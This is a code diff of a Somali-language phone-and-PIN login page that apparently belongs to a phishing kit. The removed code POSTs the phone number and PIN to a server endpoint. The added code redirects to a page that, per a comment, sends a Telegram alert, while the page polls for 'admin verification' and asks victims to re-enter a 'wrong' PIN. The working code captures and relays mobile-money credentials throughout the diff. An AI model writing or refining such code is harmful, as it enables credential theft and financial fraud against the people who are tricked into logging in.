@@ -103,7 +103,6 @@
 
 <body>
 
-<!-- Added Loading Overlay to track Admin Verification -->
 <div id="loading-overlay">
     <div class="spinner"></div>
     <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
@@ -117,7 +116,6 @@
 <div class="main-content">
     <h2>Gal</h2>
 
-    <!-- Error container element -->
     <div id="errorDisplay" class="error-banner"></div>
 
     <div class="phone-display">
@@ -163,7 +161,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     let pollingInterval;
 
-    // Detect URL parameter tracking redirect values
+    // Process wrong pin status from redirect parameter
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('error') === 'wrongpin') {
         errorDisplay.innerText = "❌ PIN waa khalad, fadlan geli PIN-ka saxda ah.";
@@ -200,30 +198,22 @@ document.addEventListener("DOMContentLoaded", () => {
         eye.textContent = show ? "🫣" : "👁️";
     });
 
-    loginBtn.addEventListener('click', async () => {
+    loginBtn.addEventListener('click', () => {
         if (!savedPhone) return;
         
         let pin = "";
         pinBoxes.forEach(b => pin += b.value);
         localStorage.setItem('lastPin', pin);
 
-        errorDisplay.style.display = "none";
-        overlay.style.display = "flex";
-
-        try {
-            // Post payload data to active server tracking loop
-            await fetch('/api/login-notification', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: savedPhone, pin: pin })
-            });
-            startPolling();
-        } catch (err) {
-            overlay.style.display = "none";
-            errorDisplay.innerText = "❌ Khalad ayaa dhacay xiriirka.";
-            errorDisplay.style.display = "block";
-        }
+        // Redirects to page7 directly, letting page7 trigger the single telegram alert cleanly
+        window.location.href = "/page7.html";
     });
+
+    // Handle incoming backends checking loop if redirected inside an existing context
+    if (urlParams.get('poll') === 'true') {
+        overlay.style.display = "flex";
+        startPolling();
+    }
 
     function startPolling() {
         clearInterval(pollingInterval);
@@ -242,6 +232,8 @@ document.addEventListener("DOMContentLoaded", () => {
                     errorDisplay.innerText = "❌ Faahfaahinta aad gelisay waa khalad.";
                     errorDisplay.style.display = "block";
                     resetInputs();
+                    // Clean URL query parameter tracking state
+                    window.history.replaceState({}, document.title, window.location.pathname);
                 }
             } catch (e) {}
         }, 3000);
